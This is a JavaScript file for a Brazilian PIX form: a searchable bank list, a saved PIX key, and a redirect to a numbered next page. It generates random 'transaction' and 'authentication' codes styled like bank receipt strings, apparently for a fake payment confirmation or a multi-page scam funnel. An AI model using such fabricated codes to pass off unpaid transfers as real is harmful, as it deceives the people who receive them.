// Lista de bancos brasileiros
const bancos = [
    // Bancos tradicionais
    "Banco do Brasil",
    "Itaú",
    "Bradesco",
    "Caixa Econômica Federal",
    "Santander",
    "Banrisul",
    "Banco Safra",
    "Banco Mercantil do Brasil",
    "Banco Daycoval",
    "Banco Votorantim (BV)",
    "Banco Rendimento",

    // Bancos digitais
    "Nubank",
    "Inter",
    "C6 Bank",
    "Next",
    "Original",
    "Neon",
    "Banco Pan",
    "PagBank",
    "PicPay",
    "Digio",
    "Modalmais",

    // Cooperativas de crédito
    "Sicoob",
    "Sicredi",
    "Unicred",

    // Bancos regionais e especializados
    "Banco do Nordeste",
    "Banco da Amazônia",
    "Banestes",
    "Banpará",
    "Banco BRB (Banco de Brasília)",
    "Banco BMG",
    "Banco Topázio",
    "Banco Alfa",
    "Banco Sofisa",

    // Bancos de montadoras
    "Banco Toyota",
    "Banco PSA (Peugeot/Citroën)",
    "Banco Volkswagen",
    "Banco Fiat",
    "Banco CNH Industrial",

    // Bancos de investimento
    "BTG Pactual",
    "XP Investimentos",
    "Banco Modal",
    "Banco Pine",

    // Fintechs e bancos de pagamento
    "InfinitePay",
    "Mercado Pago",
    "Stone Pagamentos",
    "Dock",
    "Zippi",
    "Will Bank",
    "Creditas",

    // Outros
    "Credicard",
    "Banco Caruana",
    "Banco Original do Agronegócio",
    "Banco Renault",
    "Banco Honda",
    "Banco Yamaha",
    "Banco Volvo",
    "Banco Caterpillar",
    "Banco Ford",
];

// Elementos do DOM
const bankSearch = document.getElementById('bankSearch');
const bankList = document.getElementById('bankList');
const pixForm = document.getElementById('pixForm');
const pixKeyInput = document.getElementById('pixKey');

// Carregar valor salvo do pixKey do localStorage quando a página carregar
window.addEventListener('load', () => {
    const savedPixKey = localStorage.getItem('pixKey');
    if (savedPixKey) {
        pixKeyInput.value = savedPixKey;
    }
});

// Salvar no localStorage sempre que o input mudar
pixKeyInput.addEventListener('input', (e) => {
    localStorage.setItem('pixKey', e.target.value);
});

// Função para gerar código de transação aleatório
function generateTransactionCode() {
    const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let code = '';
    for (let i = 0; i < 10; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}

// Função para gerar código de autenticação
function generateAuthCode() {
    const chars = '0123456789ABCDEF';
    let code = '';
    for (let i = 0; i < 40; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
        if ((i + 1) % 2 === 0 && i < 39) code += '.';
    }
    return code;
}

// Função para formatar data
function formatDate(date) {
    return date.toLocaleDateString('pt-BR', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric'
    });
}

// Função para formatar hora
function formatTime(date) {
    return date.toLocaleTimeString('pt-BR', {
        hour: '2-digit',
        minute: '2-digit',
        timeZone: 'America/Sao_Paulo'
    }) + ' (UTC-3 São Paulo)';
}

// Função para filtrar bancos
function filterBanks(searchTerm) {
    return bancos.filter(banco => 
        banco.toLowerCase().includes(searchTerm.toLowerCase())
    );
}

// Função para mostrar a lista de bancos
function showBankList(filteredBanks) {
    bankList.innerHTML = '';
    filteredBanks.forEach(banco => {
        const div = document.createElement('div');
        div.className = 'bank-item';
        div.textContent = banco;
        div.onclick = () => {
            bankSearch.value = banco;
            bankList.classList.remove('active');
        };
        bankList.appendChild(div);
    });
    bankList.classList.add('active');
}

// Event listeners
bankSearch.addEventListener('input', (e) => {
    const filteredBanks = filterBanks(e.target.value);
    if (filteredBanks.length > 0 && e.target.value) {
        showBankList(filteredBanks);
    } else {
        bankList.classList.remove('active');
    }
});

// Fechar a lista quando clicar fora
document.addEventListener('click', (e) => {
    if (!bankSearch.contains(e.target) && !bankList.contains(e.target)) {
        bankList.classList.remove('active');
    }
});

// Manipular envio do formulário
pixForm.addEventListener('submit', (e) => {
    e.preventDefault();

    const banco = bankSearch.value;

    const pixKey = pixKeyInput.value;
    
    if (!banco) {
        alert('Por favor, selecione um banco');

        return;
    }
    
    if (!pixKey) {
        alert('Por favor, informe sua chave PIX');

        return;
    }
    
    const now = new Date();

    const requestData = {
        pixKey,
        date: formatDate(now),
        time: formatTime(now),
        transactionCode: generateTransactionCode(),
        authCode: generateAuthCode()
    };
    
    localStorage.setItem('requestData', JSON.stringify(requestData));

    window.location.href = '../page-09' + window.location.search;
});
